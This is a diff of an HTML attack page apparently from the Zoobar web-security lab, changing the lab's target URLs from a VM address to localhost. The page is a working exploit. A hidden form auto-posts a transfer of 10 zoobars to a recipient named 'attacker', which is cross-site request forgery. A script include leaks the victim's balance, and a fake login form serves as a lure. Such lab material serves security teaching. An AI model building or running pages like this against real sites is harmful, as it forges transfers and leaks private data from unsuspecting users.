@@ -2,7 +2,7 @@
 <html>
   <head>
     <link type="text/css" rel="stylesheet"
-          href="http://192.168.56.101/zoobar-ps/zoobar.css">
+          href="http://localhost/zoobar/zoobar.css">
   </head>
   <body>
     <div style="display: none;">
@@ -10,7 +10,7 @@
       <div id="myZoobars">Nope</div>
 			<!-- END:leak_html -->
       
-      <form action="http://192.168.56.101/zoobar-ps/transfer.php" id="post_form"
+      <form action="http://localhost/zoobar/transfer.php" id="post_form"
             method="post" enctype="application/x-www-form-urlencoded">
         <input type="hidden" name="recipient" value="attacker" />
         <input type="hidden" name="zoobars" value="10" />
@@ -32,9 +32,9 @@
       <h2>Supporting the best soldiers of the next generation</h2>
       <div id="login" class="centerpiece"> 
         <form name="loginform" method="POST"
-              action="http://192.168.56.101/zoobar-ps/index.php"> 
+              action="http://localhost/zoobar/index.php"> 
           <table> 
-          <tr> 
+          <tr>
              <td>Username:</td> 
             <td><input type="text" name="login_username" size="20"
                        autocomplete="no" value=""></td> 
@@ -58,7 +58,7 @@
     
 		<!-- START:leak_js -->
     <script type="text/javascript"
-            src="http://192.168.56.101/zoobar-ps/zoobars.js.php">
+            src="http://localhost/zoobar/zoobars.js.php">
     </script>
     <script type="text/javascript">
       if (document.getElementById('myZoobars').innerHTML == 'Nope') {
